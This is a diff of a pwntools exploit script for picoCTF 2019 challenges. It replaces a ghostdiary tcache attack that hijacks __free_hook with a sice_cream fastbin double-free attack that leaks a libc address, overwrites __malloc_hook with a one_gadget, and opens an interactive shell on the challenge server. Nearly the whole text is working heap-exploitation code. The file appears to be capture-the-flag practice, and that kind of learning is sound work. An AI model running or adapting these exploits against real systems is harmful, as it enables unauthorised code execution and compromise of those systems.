@@ -1,83 +1,97 @@
 from pwn import *
 
-e = ELF("./ghostdiary")
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+e = ELF("./sice_cream")
+libc = ELF("./libc.so.6")
 
 context.binary = e.path
 
 if "--remote" in sys.argv:
-  s = ssh(host="2019shell1.picoctf.com", user="gamester543", password="")
-  p = s.process("/problems/ghost-diary_3_79b47a93e884f13bbc2640b2e8606676/ghostdiary")
+  p = remote("2019shell1.picoctf.com", 29554)
 else:
-  p = process(e.path,
+  p = process(e.path
   )
   #{"LD_PRELOAD": libc.path})
 
-def alloc(size, payload="AAAA"):
-  p.sendline("1")
-  p.sendlineafter(">", "2" if size > 0x100 else "1")
-  p.sendlineafter(":", str(size))
-  p.recvuntil(">")
+idx = 0
+def alloc(size, pay="AAAA"):
+  global idx
 
-def edit(idx, payload="AAAA"):
-  p.sendline("2")
-  p.sendlineafter(":", str(idx))
-  p.sendafter(":", payload)
-  p.recvuntil(">")
+  p.sendline("1")
+  p.sendlineafter(">", str(size))
+  p.sendlineafter(">", pay)
+  p.recvuntil(">")  
+
+  ret = idx
+  idx += 1
+  return ret
 
 def free(idx):
-  p.sendline("4")
-  p.sendlineafter(":", str(idx))
+  p.sendline("2")
+  p.sendlineafter(">", str(idx))
+  p.recvuntil(">")  
+
+def change(name):
+  p.sendline("3")
+  p.sendlineafter(">", name)
+  
+  p.recvuntil("a name like ")
+  ret = p.recvuntil("!", drop=True)  
+
   p.recvuntil(">")
 
+  return ret
+
+p.recvuntil(">")
+p.sendline("A" * 8 + p64(0x61) + p64(0))
+
 p.recvuntil(">")
 
-for i in range(7):
-  alloc(0x118)
+A = alloc(0x58)
+B = alloc(0x58)
 
-alloc(0x118) # 7
-alloc(0x118) # 8
-alloc(0x118) # 9
-alloc(0x30)
+A2 = alloc(0x48)
+B2 = alloc(0x48)
 
-for i in range(7):
-  alloc(0x88)
+free(A)
+free(B)
+free(A)
 
-edit(8, "A" * 0xf0 + p64(0x100) + "\n")
+alloc(0x58, p64(0x602040))
+alloc(0x58)
+alloc(0x58)
+C = alloc(0x58)
 
-for i in range(7):
-  free(i)
+change("A" * 8 + p64(0x91).ljust(0x90, "\x00") + p64(0x11) + p64(0) + p64(0x11))
+free(C)
+bin_ptr = u64(change("A" * 0xf)[0x10:].ljust(8, "\x00"))
+leak = bin_ptr - 0x7fadb1047b78 + 0x00007fadb0c83000
+print("{:#x}".format(leak))
 
-free(8)
-edit(7, "A" * 0x118)
-edit(7, "A" * 0x118)
 
-alloc(0x88)
 
-p.sendline("3")
-p.sendlineafter(":", "0")
-p.recvuntil(": ")
-leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7f4592fbfd90 + 0x00007f4592bd4000
-print("{:#x}").format(leak)
-p.recvuntil(">")
+free(A2)
+free(B2)
+free(A2)
 
-alloc(0x30)
+alloc(0x48, p64(0x61))
+alloc(0x48)
+alloc(0x48)
 
-for i in range(11, 18):
-  free(i)
+free(A)
+free(B)
+free(A)
 
-free(0)
-free(9)
+alloc(0x58, p64(leak + libc.symbols["__malloc_hook"] + 0x28))
+alloc(0x58)
+alloc(0x58)
+alloc(0x58, "\x00" * 0x30 + p64(leak + libc.symbols["__malloc_hook"] - 0x10))
 
-free(1)
+change("A" * 0x8 + p64(0x21) + p64(bin_ptr) * 2)
 
-alloc(0x128)
-edit(0, "/bin/sh".ljust(0x88, "\x00") + p64(0x1337) + p64(leak + libc.symbols["__free_hook"]) + "\n")
-alloc(0x30)
-alloc(0x30)
-edit(2, p64(leak + libc.symbols["system"]) + "\n")
+alloc(0x58, p64(leak + [0x45216, 0x4526a, 0xf02a4, 0xf1147][2]))
 
-p.sendline("4")
-p.sendlineafter(":", "0")
+free(A)
+p.sendline("2")
+p.sendlineafter(">", str(A))
 
 p.interactive()
